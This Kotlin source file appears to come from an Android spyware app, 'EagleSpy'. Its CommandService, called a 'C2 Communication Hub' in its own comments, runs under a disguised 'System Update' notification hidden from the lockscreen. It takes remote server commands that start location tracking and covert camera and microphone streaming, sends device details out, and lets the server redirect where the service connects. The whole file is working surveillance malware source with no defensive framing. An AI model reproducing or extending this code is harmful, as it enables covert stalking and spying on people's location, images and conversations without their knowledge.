package com.stealth.eaglespy.services

import android.app.*
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.stealth.eaglespy.EagleSpyApp
import com.stealth.eaglespy.webrtc.SignalingClient
import org.json.JSONObject

/**
 * Command Service - Main C2 Communication Hub
 * Receives commands from server and dispatches to appropriate services
 */
class CommandService : Service() {

    companion object {
        private const val NOTIFICATION_ID = 2000
        private const val CHANNEL_ID = "command_channel"
    }

    private var signalingClient: SignalingClient? = null
    private var isConnected = false

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForegroundWithNotification()
        connectToServer()
        return START_STICKY
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Core system service"
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }

            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun createStealthNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Update")
            .setContentText("Checking for updates...")
            .setSmallIcon(android.R.drawable.ic_popup_sync)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()
    }

    private fun startForegroundWithNotification() {
        val notification = createStealthNotification()
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    private fun connectToServer() {
        if (isConnected) return

        signalingClient = SignalingClient(
            EagleSpyApp.serverUrl,
            EagleSpyApp.deviceId,
            "command"
        )

        signalingClient?.setCommandListener(object : SignalingClient.CommandListener {
            override fun onCommand(command: String, params: JSONObject) {
                handleCommand(command, params)
            }
        })

        signalingClient?.connect()
        isConnected = true
    }

    private fun handleCommand(command: String, params: JSONObject) {
        when (command) {
            // Location Commands
            "start_location" -> {
                val intent = Intent(this, LocationService::class.java).apply {
                    action = "START_TRACKING"
                }
                startService(intent)
            }
            "stop_location" -> {
                val intent = Intent(this, LocationService::class.java).apply {
                    action = "STOP_TRACKING"
                }
                startService(intent)
            }

            // Camera Commands
            "start_camera" -> {
                val useFront = params.optBoolean("front", true)
                val intent = Intent(this, CameraService::class.java).apply {
                    action = "START_STREAM"
                    putExtra("front_camera", useFront)
                }
                startService(intent)
            }
            "stop_camera" -> {
                val intent = Intent(this, CameraService::class.java).apply {
                    action = "STOP_STREAM"
                }
                startService(intent)
            }
            "switch_camera" -> {
                val intent = Intent(this, CameraService::class.java).apply {
                    action = "SWITCH_CAMERA"
                }
                startService(intent)
            }

            // Audio Commands
            "start_audio" -> {
                val intent = Intent(this, AudioService::class.java).apply {
                    action = "START_STREAM"
                }
                startService(intent)
            }
            "stop_audio" -> {
                val intent = Intent(this, AudioService::class.java).apply {
                    action = "STOP_STREAM"
                }
                startService(intent)
            }

            // System Commands
            "ping" -> {
                signalingClient?.sendMessage("pong", JSONObject().apply {
                    put("device_id", EagleSpyApp.deviceId)
                    put("timestamp", System.currentTimeMillis())
                })
            }

            "get_device_info" -> {
                val info = collectDeviceInfo()
                signalingClient?.sendMessage("device_info", info)
            }

            "update_config" -> {
                val serverUrl = params.optString("server_url")
                if (serverUrl.isNotEmpty()) {
                    EagleSpyApp.serverUrl = serverUrl
                    reconnect()
                }
            }
        }
    }

    private fun collectDeviceInfo(): JSONObject {
        return JSONObject().apply {
            put("device_id", EagleSpyApp.deviceId)
            put("manufacturer", android.os.Build.MANUFACTURER)
            put("model", android.os.Build.MODEL)
            put("os_version", android.os.Build.VERSION.RELEASE)
            put("sdk_int", android.os.Build.VERSION.SDK_INT)
            put("app_version", packageManager.getPackageInfo(packageName, 0).versionName)
        }
    }

    private fun reconnect() {
        signalingClient?.disconnect()
        isConnected = false
        connectToServer()
    }

    override fun onDestroy() {
        signalingClient?.disconnect()
        isConnected = false
        super.onDestroy()
    }
}
